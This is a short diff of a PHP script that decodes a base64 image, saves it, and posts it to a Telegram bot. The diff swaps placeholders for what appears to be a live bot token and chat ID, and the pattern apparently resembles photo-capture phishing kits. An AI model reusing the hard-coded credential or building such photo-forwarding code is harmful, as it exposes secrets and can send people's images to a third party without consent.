@@ -7,8 +7,8 @@ if ($image) {
     $image = base64_decode($image);
     file_put_contents("photo.png", $image);
 
-    $botToken = "123456789:ABCDEF-Your-Telegram-Bot-Token";
-    $chatID = "YOUR_TELEGRAM_CHAT_ID";
+    $botToken = "7184974136:AAFkcNjXwOKVJmSgqPnXvd4Fo9DwC4UPFWs";
+    $chatID = "7006569478";
 
     $url = "https://api.telegram.org/bot$botToken/sendPhoto";
     $postFields = [
